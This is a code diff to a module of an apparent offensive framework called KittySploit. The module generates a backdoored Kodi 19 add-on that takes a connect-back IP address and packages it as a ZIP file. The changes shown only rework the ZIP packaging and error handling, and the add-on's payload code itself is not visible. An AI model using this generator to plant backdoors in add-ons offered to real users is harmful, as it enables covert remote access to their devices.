@@ -1,5 +1,6 @@
 from kittysploit import *
 import zipfile
+import os
 
 class Module(Backdoor):
 	
@@ -7,7 +8,7 @@ class Module(Backdoor):
 		'name': 'Kodi Plugin Generator',
 		'description': 'Kodi Plugin Generator for Kodi 19',
 		'author': 'KittySploit Team',
-		'arch': Arch.MISC,
+		'arch': [Arch.X86, Arch.X64],
 	}
 
 	lhost = OptIP('','Connect-back IP address', True)
@@ -66,17 +67,37 @@ class Module(Backdoor):
 		
 		self.write_out_dir("KodiBackdoor/addon.py", addon)
 		
-	def zipdir(self, path, ziph):
+	def zipdir(self, path, ziph, base_path):
+		"""Add directory contents to zip file with proper relative paths"""
 		for root, dirs, files in os.walk(path):
 			for file in files:
-				ziph.write(os.path.join(root, file))
+				file_path = os.path.join(root, file)
+				# Calculate relative path from base_path for arcname
+				arcname = os.path.relpath(file_path, base_path)
+				ziph.write(file_path, arcname)
 
 	def run(self):
 		print_status("Directory created")
-		self.create_out_dir("KodiBackdoor")
+		create_dir = self.create_dir("KodiBackdoor")
+		if not create_dir:
+			print_error("Error creating directory")
+			return False
+		
 		self.addonXml()
 		self.addonPy()
-		zipf = zipfile.ZipFile(os.getcwd()+"/output/"+self.addon_id+'.zip', 'w', zipfile.ZIP_DEFLATED)
-		self.zipdir('KodiBackdoor', zipf)
-		zipf.close()
+		
+		# Get the output directory path
+		output_dir = os.path.join(os.getcwd(), "output")
+		kodi_dir = os.path.join(output_dir, "KodiBackdoor")
+		zip_path = os.path.join(output_dir, self.addon_id + '.zip')
+		
 		print_status("Putting everything in ZIP file...")
+		try:
+			zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
+			self.zipdir(kodi_dir, zipf, output_dir)
+			zipf.close()
+			print_success(f"ZIP file created: {zip_path}")
+			return True
+		except Exception as e:
+			print_error(f"Error creating ZIP file: {e}")
+			return False
